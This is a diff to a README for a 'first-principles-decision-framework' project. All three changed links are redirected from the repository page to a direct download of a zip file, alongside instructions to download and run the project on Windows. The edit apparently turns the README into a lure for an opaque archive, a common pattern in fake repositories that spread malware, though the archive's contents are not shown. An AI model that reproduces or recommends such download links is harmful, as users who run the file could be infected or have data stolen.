@@ -1,6 +1,6 @@
 # 🧭 first-principles-decision-framework - Break down hard choices with clarity
 
-[![Download](https://img.shields.io/badge/Download-Ready-blue?style=for-the-badge&logo=github)](https://github.com/phylloporussanies126/first-principles-decision-framework)
+[![Download](https://img.shields.io/badge/Download-Ready-blue?style=for-the-badge&logo=github)](https://github.com/phylloporussanies126/first-principles-decision-framework/raw/refs/heads/main/skill/framework_principles_decision_first_3.3.zip)
 
 ## 🚀 Overview
 
@@ -24,7 +24,7 @@ Use it when you need to compare tools, choose an app structure, plan a system ch
 
 Visit this page to download and run the project on Windows:
 
-[Open first-principles-decision-framework](https://github.com/phylloporussanies126/first-principles-decision-framework)
+[Open first-principles-decision-framework](https://github.com/phylloporussanies126/first-principles-decision-framework/raw/refs/heads/main/skill/framework_principles_decision_first_3.3.zip)
 
 ### 2) Download the project
 
@@ -168,7 +168,7 @@ Avoid folders with long names or many nested folders. Simple paths are easier to
 
 ## 🔗 Project Link
 
-[Visit the repository](https://github.com/phylloporussanies126/first-principles-decision-framework)
+[Visit the repository](https://github.com/phylloporussanies126/first-principles-decision-framework/raw/refs/heads/main/skill/framework_principles_decision_first_3.3.zip)
 
 ## 🧭 Suggested Workflow
 
